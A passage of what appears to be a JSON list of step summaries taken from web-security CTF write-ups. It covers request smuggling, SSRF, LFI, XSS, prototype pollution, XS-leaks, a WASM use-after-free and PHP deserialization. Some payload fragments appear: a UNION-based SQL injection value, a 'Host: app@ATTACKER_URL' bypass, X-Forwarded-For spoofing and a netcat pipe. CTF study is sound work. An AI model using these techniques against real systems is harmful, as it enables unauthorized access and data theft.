    "Extract the second flag from the decoded field.",
    "Understand that the Request smuggling vulnerabilities were discovered during previous research.",
    "Recognized that /api/flag-plz is mapped to /forbidden.",
    "Recognized that /api is mapped to /.",
    "Realized that http://flagportal.chall.seetf.sg:10001/api//flag-plz would be mapped to http://backend/flag-plz.",
    "Identified 2 HTTP request smuggling vulnerabilities.",
    "Used the discovered mapping to smuggle a request to /admin in flagportal.",
    "Performed an SSRF.",
    "Constructed a request to /admin.",
    "Caught the request including the Admin-Key on our own server.",
    "Obtained the first flag.",
    "Included a \\n character in a chunk extension in the second part of the challenge.",
    "Exploited a difference in how ATS and Waitress process end-of-line symbols.",
    "Crafted another request smuggling attack.",
    "Encapsulated the second request within the chunked contents of the first request.",
    "Used python3 payload.py | nc localhost 8000 to see the second flag on the receiving server.",
    "Include request body with 'logging' attribute set to true.",
    "Use the known hash of an empty string as a token value for authentication.",
    "Include Thymeleaf expression to fetch the value of 'FLAG' environment variable.",
    "Provide authentication to view the server logs.",
    "Identify LFI vulnerability.",
    "View '/etc/passwd' using LFI vulnerability.",
    "Discover RCE vulnerability through pre-installed 'pearcmd.php'.",
    "Construct PHP payload.",
    "Write PHP payload to '/tmp/pwn.php'.",
    "Include '/tmp/pwn.php' using LFI.",
    "Understand that the challenge focuses on exploiting dynamic renderers",
    "Understand that Prerender is used to render sensitive endpoints",
    "Understand that the rendering is done via a custom host header",
    "Take note of the Nginx configuration",
    "Understand that the URL rewriting is done using the host header",
    "Attempt to display the flag within the response body",
    "Attempt to achieve this using client-sided redirects",
    "Acknowledge the implementation of extra checks",
    "Understand that XSS within the Chromium renderer is necessary",
    "Understand that the usage of 'localhost:3000' origin avoids the Same Origin Policy",
    "Take notice of the 'validateUrls' mechanism",
    "Understand that the mechanism validates the URL format",
    "Understand that the mechanism can be bypassed using 'username:password@hostname' URL format",
    "Use 'Host: app@ATTACKER_URL' to bypass the validation",
    "Recognize the naive 'script remover'",
    "Understand that script tags can be bypassed using 'onload' event handlers",
    "Acknowledge the replacement of flags by Nginx",
    "Understand that redirects to 'http://app/login.php' will not solve the challenge",
    "Understand the requirement of achieving XSS within the 'localhost:3000' origin",
    "Understand the usage of 'localhost:3000/render?url=' feature",
    "Understand the need to avoid the same-origin policy for reading the flag",
    "Host the 'outer.html' file",
    "Host the 'inner.html' file",
    "Send a GET request to 'outer.html'",
    "Use the custom host header to target your own host",
    "The URL is fetched for the first time to check for an SSRF attempt.",
    "The URL is fetched for the second time once it's deemed legitimate.",
    "Realized that the two-fetch mechanism could be exploited with two different responses.",
    "Initialized a server to exploit the above vulnerability.",
    "Configured the server to give two different responses.",
    "The first response is designed to pass the SSRF check.",
    "Programmed the server to redirect to 'http://localhost/flag' in the second response.",
    "Notice that 'mootools' JavaScript library is used.",
    "Identify that the JavaScript library is vulnerable to client-side prototype pollution.",
    "Identify that if the request token is wrong, then the 'request.accessGranted' attribute would not be set.",
    "Observe that the 'request.accessGranted' attribute becomes undefined in such cases.",
    "Execute Prototype pollution attack.",
    "Manipulate the 'accessGranted' attribute to bypass Access Denied error.",
    "Notice that a 'note' is 'found' if it starts with 'request.search'.",
    "Use the navigation factor.",
    "Perform an XS leak attack.",
    "Verify if a substring exists in the flag.",
    "Conduct an extraction of the flag character by character.",
    "Leverage the navigation function and the XS leak.",
    "Identify the suspicious logic of the JavaScript.",
    "Check if 'length' query parameter exists.",
    "Verify if 'length' query parameter is a string of length 0.",
    "Notice that the 'name' variable is not declared in this case.",
    "Observe that global scope is the window object in HTML.",
    "Note that the 'name' variable refers to 'window.name'.",
    "Understand that 'window.name' can be controlled when a new window is opened.",
    "Decide to control the 'window.name' variable.",
    "Recognize that this control can be used to exploit the vulnerability.",
    "Recreate the scenario where 'name' variable is never redeclared.",
    "Use '?length=' as the query string.",
    "Ensure that 'usernameLength' is empty through the query string.",
    "Create an exploit script.",
    "Use 'window.open()' on the exploit server.",
    "Control the 'window.name' variable with the exploit script.",
    "Use an XSS payload.",
    "Fetch the flag using 'innerHTML'.",
    "Successfully fetch the flag using the XSS payload.",
    "Identified a Use After Free (UAF) vulnerability.",
    "Noticed that the HEAD never updates if the first index is removed.",
    "Realized that `HEAD->name` can be controlled.",
    "Identified the next `malloc()` call in `insertSorted()` where the overwrite can happen.",
    "Noted the absence of ASLR in WASM.",
    "Determined that the address of the XSS payload can be predicted.",
    "Realized that Chrome DevTools can be used for debugging and obtaining the required information.",
    "Noticed that the `name` is written to memory regardless of XSS check.",
    "Identified the possibility of 'inserting' and overwriting the XSS payload in the `HEAD->name`.",
    "Realized that `getNameAtIndex(0)` will return the XSS payload when displaying the table.",
    "Identified a suitable breakpoint after the `malloc` call and before the `strcpy` call.",
    "Noticed that `$var8` is set immediately after `call $dlmalloc`.",
    "Understood that `$var8` represents the pointer to the newly allocated memory for the payload.",
    "Noted that the index is randomized.",
    "Recognized the 10% chance of success.",
    "Understood the strategy of executing multiple times until the index is 0.",
    "Load the page at `/`.",
    "Observe that the page says `Hello Mars!`.",
    "Discover the app at `http://whatever.domain.com/app/`.",
    "Use the `dirb/wordlists/common.txt` wordlist.",
    "Find the endpoint.",
    "Discover that the application is a PHP proxy.",
    "Understand that the PHP proxy allows users to visit websites from it.",
    "Read the footer of the application.",
    "Identify that the application is 'Powered by PHP-Proxy'.",
    "Identify PHP-Proxy as having a Local File Inclusion (LFI) vulnerability.",
    "Identify the method of generating the encryption key.",
    "Discover that the URL is encrypted using `str_rot_pass($url, $key);`.",
    "Find out that the encryption function is not secure enough to prevent decryption.",
    "Reverse-engineer the key using the ciphertext and original plaintext.",
    "Encrypt `file:///var/www/html/flag.txt` using the obtained key.",
    "Realize that the `file://` protocol was not banned, allowing the encryption.",
    "Use `python3 solve.py` to exploit the Local File Inclusion (LFI) vulnerability.",
    "Retrieve the flag `STC{l0cal_f1l3_1nclus10n_328d47c2ac5b2389ddc47e5500d30e04}`.",
    "Examined the index.php.",
    "Found a comment detailing an admin console at http://172.16.2.155.",
    "Attempted to navigate to login.php.",
    "Received a 403 Forbidden error.",
    "Conducted a scan for the 172.16.2.0/24 subnet.",
    "Used the X-Forwarded-For header in the scan.",
    "Used a tool like Burp Suite Intruder for the scan.",
    "Set X-Forwarded-For to 172.16.2.24.",
    "Achieved access to the login page.",
    "Performed a curl command.",
    "Used localhost:55043/login.php as the target URL.",
    "Set X-Forwarded-For header to 172.16.2.24.",
    "Sent a POST request to /login.php.",
    "Altered the email field: 'test' UNION SELECT 'test', 'test'#.",
    "Altered the pass field.",
    "Received a server response after successful SQL injection.",
    "Extracted the challenge flag from the server response.",
    "Analyzed the provided PHP source code.",
    "Examined the authentication process.",
    "Identified the 'login' cookie.",
    "Understood the deserialization process.",
    "Understood the structure of the 'Login' object.",
    "Identified the 'User' object and MFA token within 'Login'.",
    "Identified the presence of SQL object within User Class.",
    "Examined SQL queries executed for user authentication.",
    "Identified the opportunity for a PHP Object Injections vulnerability.",
    "Linked the vulnerability to the deserialization process.",
    "Formulated a Property-Oriented Programming (POP) chain.",
    "Aligned the chain with the identified vulnerability.",
    "Created a custom 'Login' object.",
    "Modified '$mfa_token' to reference '$_correctValue' attribute.",
    "Exploited MFA token check bypass.",
    "Identified the 'SQL' class within the code.",
    "Noticed the presence of the '$query' attribute within 'SQL' class.",
    "Realized the potential for modifying '$query' for SQL injection.",
    "Crafted an SQL query for 'valid' result set.",
    "Ensured the query returns 'email' and 'password' columns.",
    "Exploited the query to bypass the authentication check.",
    "Utilized the PHP serialize() function.",
    "Serialized the custom 'Login' object.",
    "Created a base64 encoded string.",
    "Inserted the serialized data into the 'login' cookie.",
    "Injected the exploit into the 'login' cookie.",
    "Bypassed the login process.",
    "Gained access to the system."
]